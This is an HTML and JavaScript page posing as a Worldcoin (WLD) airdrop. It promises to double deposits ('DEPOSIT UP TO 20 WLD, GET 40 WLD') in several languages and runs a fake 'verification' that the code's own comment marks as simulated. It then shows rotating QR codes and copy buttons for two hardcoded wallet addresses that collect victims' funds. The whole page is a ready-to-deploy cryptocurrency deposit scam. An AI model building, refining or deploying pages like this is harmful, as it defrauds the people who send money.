<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>WLD Airdrop</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
*{margin:0;padding:0;box-sizing:border-box}
html,body{
  width:100%;
  height:100%;
  font-family:Inter,system-ui,sans-serif;
  background:#f2f2f2;
  overflow:hidden;
}

.center{
  height:100%;
  display:flex;
  flex-direction:column;
  align-items:center;
  justify-content:center;
  text-align:center;
}

/* LOGO */
.logo{
  width:90px;
  animation:spin 20s linear infinite;
}
@keyframes spin{
  from{transform:rotateY(0)}
  to{transform:rotateY(360deg)}
}

/* AIRDROP TEXT (CONTROLADO POR JS) */
.airdrop-text{
  margin-top:22px;
  font-weight:700;
  letter-spacing:2px;
  font-size:20px;
  opacity:0;
  transition:opacity 1s ease;
}
.airdrop-text.show{
  opacity:1;
}

/* VERIFY */
#widBox button{
  margin-top:26px;
  padding:14px 30px;
  border:none;
  border-radius:10px;
  background:#000;
  color:#fff;
  letter-spacing:2px;
  cursor:pointer;
}

/* SPINNER */
.spinner{
  display:none;
  margin-top:20px;
  width:40px;
  height:40px;
  border:4px solid rgba(0,200,120,.3);
  border-top:4px solid #00c389;
  border-radius:50%;
  animation:spin2 1s linear infinite;
}
@keyframes spin2{to{transform:rotate(360deg)}}

/* QR */
.qr-box{
  display:none;
  margin-top:26px;
}
#qrCanvas{
  background:#fff;
  padding:12px;
  border-radius:14px;
}
.renew{
  margin-top:8px;
  font-size:12px;
  letter-spacing:2px;
  opacity:.7;
}

/* COPY */
.deposit-code{
  display:none;
  margin-top:14px;
}
.deposit-code input{
  width:320px;
  padding:10px;
  text-align:center;
  border-radius:6px;
  border:1px solid #ccc;
}
.deposit-code button{
  margin-top:10px;
  padding:10px 22px;
  border:none;
  border-radius:6px;
  background:#000;
  color:#fff;
  cursor:pointer;
}
#copyMsg{
  display:block;
  margin-top:6px;
  font-size:12px;
  opacity:0;
}

/* STATUS */
.status{
  margin-top:16px;
  font-size:14px;
  letter-spacing:1px;
}
</style>
</head>

<body>

<div class="center">

  <img src="logowld.png" class="logo">

  <!-- AIRDROP TEXT -->
  <div class="airdrop-text" id="airdropText"></div>

  <!-- VERIFY -->
  <div id="widBox">
    <button id="verifyBtn">VERIFY</button>
  </div>

  <!-- SPINNER -->
  <div class="spinner" id="spinner"></div>

  <!-- QR -->
  <div class="qr-box" id="qrBox">
    <canvas id="qrCanvas" width="160" height="160"></canvas>
    <div class="renew">renew in <span id="renewCounter">20</span></div>
  </div>

  <!-- COPY -->
  <div class="deposit-code" id="depositBox">
    <input id="addr" readonly>
    <button id="copyBtn">COPY ADDRESS</button>
    <span id="copyMsg">Copied ✓</span>
  </div>

  <div class="status" id="status"></div>

</div>

<!-- QR GENERATOR -->
<script src="https://cdn.jsdelivr.net/npm/qrious@4.0.2/dist/qrious.min.js"></script>

<script>
/* ================= AIRDROP TEXTS ================= */
const AIRDROP_TEXTS = [
  "100% EARN AIRDROP",
  "DEPOSIT UP TO 20 WLD",
  "GET 40 WLD",
  "DEPOSITE PARA RECIBIR AIRDROP",
  "DEPOSITE PARA RECEBER AIRDROP",
  "DÉPOSEZ POUR RECEVOIR AIRDROP",
  "DEPOSITA PER RICEVERE AIRDROP"
];

let airdropIndex = 0;
const airdropText = document.getElementById("airdropText");

function startAirdropText(){
  airdropText.innerText = AIRDROP_TEXTS[airdropIndex];
  airdropText.classList.add("show");

  setInterval(()=>{
    // fade out
    airdropText.classList.remove("show");

    // cuando opacity = 0, cambiar texto
    setTimeout(()=>{
      airdropIndex = (airdropIndex + 1) % AIRDROP_TEXTS.length;
      airdropText.innerText = AIRDROP_TEXTS[airdropIndex];
      airdropText.classList.add("show");
    },1000);
  },3000);
}

/* ================= WALLETS ================= */
const WALLETS = [
  "0x1f62e7890d5db2c94c280547876b050f5d1816c5",
  "0xf8af1505beb8a37207eb1f019ded31dd08fc571c"
];
let walletIndex = 0;

/* ================= QR ================= */
const qr = new QRious({
  element: document.getElementById("qrCanvas"),
  size: 160,
  value: WALLETS[0]
});

/* ================= VERIFY (SIMULADO) ================= */
verifyBtn.onclick = () => {
  widBox.style.display = "none";
  spinner.style.display = "block";
  status.textContent = "Verifying…";

  setTimeout(() => {
    spinner.style.display = "none";
    status.textContent = "✔ Verified";
    showDeposit();
  }, 4000);
};

/* ================= SHOW DEPOSIT ================= */
function showDeposit(){
  status.textContent = "Deposit to receive the airdrop";
  qrBox.style.display = "block";
  depositBox.style.display = "block";
  updateWallet();
  startRenew();
  startAirdropText();
}

/* ================= RENEW (20s) ================= */
let renew = 20;
let angle = 0;

function startRenew(){
  setInterval(()=>{
    renew--;
    renewCounter.textContent = renew;

    if(renew === 0){
      walletIndex = (walletIndex + 1) % WALLETS.length;
      updateWallet();

      angle = (angle + 90) % 360;
      qrCanvas.style.transform = `rotate(${angle}deg)`;

      renew = 20;
      renewCounter.textContent = renew;
    }
  },1000);
}

/* ================= UPDATE WALLET + QR ================= */
function updateWallet(){
  addr.value = WALLETS[walletIndex];
  qr.set({ value: WALLETS[walletIndex] });
}

/* ================= COPY ================= */
copyBtn.onclick = () => {
  navigator.clipboard.writeText(addr.value);
  copyMsg.style.opacity = 1;
  setTimeout(()=>copyMsg.style.opacity = 0, 1500);
};
</script>

</body>
</html>
